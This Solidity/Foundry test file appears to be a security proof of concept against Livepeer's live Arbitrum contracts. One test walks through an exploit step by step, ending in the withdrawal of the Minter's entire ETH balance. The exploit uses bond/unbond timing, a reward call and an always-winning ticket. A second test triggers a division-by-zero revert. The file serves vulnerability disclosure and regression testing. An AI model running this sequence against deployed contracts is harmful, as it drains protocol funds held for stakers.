pragma solidity ^0.8.9;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "./base/GovernorBaseTest.sol";

import "contracts/bonding/BondingManager.sol";
import "contracts/pm/TicketBroker.sol";
import "contracts/rounds/RoundsManager.sol";
import "contracts/token/LivepeerToken.sol";

// forge test --match-contract BondingManagerInflatedTicketPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 267164264
contract BondingManagerInflatedTicketPoc is GovernorBaseTest {
    bytes public constant DIVISION_BY_ZERO = abi.encodeWithSignature("Panic(uint256)", 0x12);

    LivepeerToken public constant TOKEN = LivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    BondingManager public constant BONDING_MANAGER = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    TicketBroker public constant TICKET_BROKER = TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
    RoundsManager public constant ROUNDS_MANAGER = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);

    address public constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;

    uint256 public constant TICKET_SENDER_KEY = 31337;

    address ticketSender;

    function setUp() public {
        ticketSender = CHEATS.addr(TICKET_SENDER_KEY);

        // Fund the attacker with 8010 LPT to main contract
        CHEATS.prank(MINTER);
        TOKEN.transfer(address(this), 8010 ether);
        // which in turn funds the second contract with 10 LPT
        TOKEN.transfer(ticketSender, 10 ether);

        TOKEN.approve(address(BONDING_MANAGER), type(uint256).max);

        CHEATS.prank(ticketSender);
        TOKEN.approve(address(BONDING_MANAGER), type(uint256).max);

        // Ticket sender needs to deposit the assets (they'll be stolen back later)
        payable(ticketSender).transfer(1 ether);
        CHEATS.prank(ticketSender);
        TICKET_BROKER.fundDeposit{ value: 1 ether }();
    }

    function test_inflatedTicketForInactiveTranscoder() public {
        uint256 startMinterBalance = MINTER.balance;

        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
        BONDING_MANAGER.bond(4000 ether, address(this));
        BONDING_MANAGER.transcoder(1e6, 1e6);

        nextRound();

        // Unbond all LPT except 1 wei, such that the transcoder becomes the last active transcoder wth 1 wei stake.
        BONDING_MANAGER.unbond(4000 ether - 1 wei);

        // Secondary attacker contract now bonds with the 10 LPT, kicking the main contract out of the active transcoders
        CHEATS.prank(ticketSender);
        BONDING_MANAGER.bond(10 ether, ticketSender);

        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not active anymore)
        BONDING_MANAGER.reward();

        nextRound();

        // Now redeeming the ticket will give 1 ETH in fees to the main attacker
        (MTicketBrokerCore.Ticket memory ticket, bytes memory signature, uint256 rand) = signWinningTicket();
        TICKET_BROKER.redeemWinningTicket(ticket, signature, rand);

        // Convert to actual fees
        BONDING_MANAGER.claimEarnings(0);

        // And withdraw the entire Minter's ETH balance
        BONDING_MANAGER.withdrawFees(payable(address(this)), MINTER.balance);

        // assert minter got stolen even more than the 1 ETH the ticket sender deposited
        assertGt(startMinterBalance, 1 ether);
        assertEq(MINTER.balance, 0);
    }

    function test_invalidTicketForUnbondedTranscoder() public {
        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
        BONDING_MANAGER.bond(4000 ether, address(this));
        BONDING_MANAGER.transcoder(1e6, 1e6);

        nextRound();

        // Unbond all LPT except such that the transcoder stops being a registered transcoder
        BONDING_MANAGER.unbond(4000 ether);

        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not registered anymore)
        BONDING_MANAGER.reward();
        assertTrue(!BONDING_MANAGER.isRegisteredTranscoder(address(this)));

        nextRound();

        // Bond back the LPT to become a registered transcoder again
        BONDING_MANAGER.bond(4000 ether, address(this));

        (uint256 lastRewardRound, , , uint256 lastActiveStakeUpdateRound, , , , , , ) = BONDING_MANAGER.getTranscoder(
            address(this)
        );
        uint256 currentRound = ROUNDS_MANAGER.currentRound();
        assertEq(lastRewardRound, currentRound - 1); // reward called in the previous round
        assertEq(lastActiveStakeUpdateRound, currentRound + 1); // stake updated in the current round

        (uint256 lastActiveRoundTotalStake, , , , ) = BONDING_MANAGER.getTranscoderEarningsPoolForRound(
            address(this),
            lastActiveStakeUpdateRound
        );
        assertGe(lastActiveRoundTotalStake, 4000 ether);
        (uint256 currentRoundTotalStake, , , , ) = BONDING_MANAGER.getTranscoderEarningsPoolForRound(
            address(this),
            currentRound
        );
        assertEq(currentRoundTotalStake, 0);

        // Now redeeming the ticket will revert because a division by a 0 totalStake on the currentRound.
        // lastActiveStakeUpdateRound > currentRound due to the bond above, so it can't be used
        (MTicketBrokerCore.Ticket memory ticket, bytes memory signature, uint256 rand) = signWinningTicket();
        CHEATS.expectRevert(DIVISION_BY_ZERO);
        TICKET_BROKER.redeemWinningTicket(ticket, signature, rand);
    }

    function signWinningTicket()
        public
        returns (
            MTicketBrokerCore.Ticket memory ticket,
            bytes memory sig,
            uint256 rand
        )
    {
        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
        ticket = MTicketBrokerCore.Ticket({
            recipient: address(this),
            sender: ticketSender,
            faceValue: 1 ether,
            winProb: type(uint256).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint256(1337))),
            auxData: abi.encodePacked(
                ROUNDS_MANAGER.currentRound(),
                ROUNDS_MANAGER.blockHashForRound(ROUNDS_MANAGER.currentRound())
            )
        });

        // Sign it
        bytes32 ticketHash = keccak256(
            abi.encodePacked(
                ticket.recipient,
                ticket.sender,
                ticket.faceValue,
                ticket.winProb,
                ticket.senderNonce,
                ticket.recipientRandHash,
                ticket.auxData
            )
        );
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(TICKET_SENDER_KEY, signHash);

        return (ticket, abi.encodePacked(r, s, v), 1337);
    }

    function nextRound() public {
        console.log("Current round (before roll): ", ROUNDS_MANAGER.currentRound());

        uint256 currentRoundStartBlock = ROUNDS_MANAGER.currentRoundStartBlock();
        uint256 roundLength = ROUNDS_MANAGER.roundLength();
        CHEATS.roll(currentRoundStartBlock + roundLength);

        ROUNDS_MANAGER.initializeRound();

        console.log("Current round (after roll): ", ROUNDS_MANAGER.currentRound());
    }

    receive() external payable {}
}
